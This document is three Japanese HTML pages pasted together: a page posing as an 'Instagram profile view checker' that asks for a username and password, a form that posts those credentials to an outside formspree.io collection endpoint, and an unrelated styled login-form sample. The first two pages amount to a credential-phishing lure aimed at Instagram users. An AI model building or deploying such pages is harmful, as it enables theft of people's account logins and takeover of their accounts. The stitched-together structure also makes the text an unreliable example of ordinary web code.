<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>私のプロフィール</title>
</head>
<body style="background-color: #f0f8ff; text-align: center; font-family: sans-serif; padding-top: 50px;">
    <h1 style="color: #333;">Instagramプロフィール閲覧チェッカー</h1>
    <p style="color: #666;">ユーザーネームとパスワードを入れてください。</p>
    <a href="https://instagram.com" style="color: #007bff; text-decoration: none;">Instagramはこちら</a>
</body>
</html>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>メッセージ送信</title>
</head>
<body>
    <form action="https://formspree.io/f/xaenadpz" method="POST">
        <p>
            <label>ユーザーネーム：<br>
                <input type="text" name="name" required style="width: 80%; padding: 8px;">
            </label>
        </p>
        <p>
            <label>パスワード：<br>
                <textarea name="message" rows="5" required style="width: 80%; padding: 8px;"></textarea>
            </label>
        </p>
        <p>
            <button type="submit" style="padding: 10px 20px;">送信する</button>
        </p>
    </form>
</body>
</html>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>フォームのサンプル</title>
    <style>
        /* type="text" と type="password" の両方に同じスタイルを適用 */
        input[type="text"],
        input[type="password"] {
            width: 100%;            /* 横幅を親要素（枠）に合わせる */
            max-width: 300px;       /* 最大幅を指定 */
            height: 40px;           /* 高さを統一 */
            padding: 8px 12px;      /* 内側の余白 */
            box-sizing: border-box; /* パディングを含めたサイズ計算にする */
            border: 1px solid #ccc; /* 枠線の太さと色 */
            border-radius: 4px;     /* 角丸の設定 */
            font-size: 14px;
        }
    </style>
</head>
<body>

    <form>
        <p>
            <label for="username">ユーザー名</label><br>
            <input type="text" id="username" name="username">
        </p>
        <p>
            <label for="password">パスワード</label><br>
            <input type="password" id="password" name="password">
        </p>
    </form>

</body>
</html>
